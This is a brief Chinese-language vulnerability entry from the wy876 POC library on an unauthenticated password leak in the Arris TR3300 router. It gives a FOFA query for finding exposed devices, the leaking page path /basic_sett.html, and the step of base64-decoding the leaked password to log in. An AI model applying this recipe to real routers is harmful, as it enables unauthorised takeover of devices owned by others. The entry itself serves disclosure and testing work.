---
fofa: "body="
source: "wy876 漏洞文库"
---

# Arris TR3300路由器basic_sett存在未授权信息泄露漏洞

# 一、漏洞简介
Arris TR3300路由器basic_sett存在未授权信息泄露漏洞

# 二、影响版本
+ Arris路由器

# 三、资产测绘
+ fofa`body="base64encode(document.tF.pws.value)" || body="ARRIS TR3300"`
+ 特征


# 四、漏洞复现
```plain
/basic_sett.html
```

密码泄露：


base64解密后登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bts33znxgp7g76vr>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
